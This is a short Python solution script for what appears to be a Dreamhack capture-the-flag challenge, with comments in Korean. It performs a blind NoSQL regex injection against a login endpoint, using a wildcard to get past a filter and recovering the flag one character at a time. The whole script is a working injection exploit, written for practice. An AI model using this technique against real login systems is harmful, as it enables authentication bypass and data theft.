from urllib import response
import requests, string

HOST = 'http://host3.dreamhack.games:15700'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''
for i in range(32):
    for ch in ALPHANUMERIC:
        # filter 우회는 임의 문자를 의미하는 . 이용
        # undefined 문자열이 출력되는 것을 통해 쿼리의 참 거짓 확인
        # format 함수를 사용해 문자열 포매팅을 할 경우 { }와 같은 중괄호(brace) 문자를 포매팅 문자가 아닌 문자 그대로 사용하고 싶은 경우에는 위 예의 {{ }}처럼 2개를 연속해서 사용하면 된다.
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break

print(f'FLAG: DH{{{flag}}}')
